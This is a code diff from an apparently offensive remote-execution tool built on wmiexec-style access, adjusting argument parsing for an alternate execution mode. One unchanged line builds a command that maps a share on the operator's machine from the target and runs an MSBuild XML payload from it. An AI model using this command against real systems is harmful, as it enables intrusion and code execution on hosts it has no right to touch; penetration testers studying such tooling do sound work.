@@ -740,7 +740,7 @@ def setup_share():
 
 def alt_exec():
 
-    yes = input('Press enter to  ')
+    yes = input('Press enter to exit ')
     print("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
 
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
@@ -950,7 +950,8 @@ if __name__ == '__main__':
     print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description="")
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
+    if '-oe' not in sys.argv: # if were using another exec method we dont need to get target
+        parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
     parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$) (wmiexec ONLY)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -1018,6 +1019,9 @@ if __name__ == '__main__':
         except Exception:
             logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
             sys.exit(1)
+
+    if '-oe' in sys.argv:
+        options.target = 'eriujf/eriuhe:\'rguire\'@1'
 
     domain, username, password, address = parse_target(options.target)
 
@@ -1093,7 +1097,7 @@ if __name__ == '__main__':
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))
 
         #automatically find the best drive to use
-        if options.drive is None and options.method == 'wmiexec' and options.oe == False:
+        if options.drive is None and options.method == 'wmiexec':
             drive_letter = auto_drive(addresses, domain)
 
         gen_payload(share_name, payload_name, drive_letter) # creates the payload
@@ -1102,7 +1106,7 @@ if __name__ == '__main__':
         command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
-        
+
         if options.oe:
             alt_exec()
 
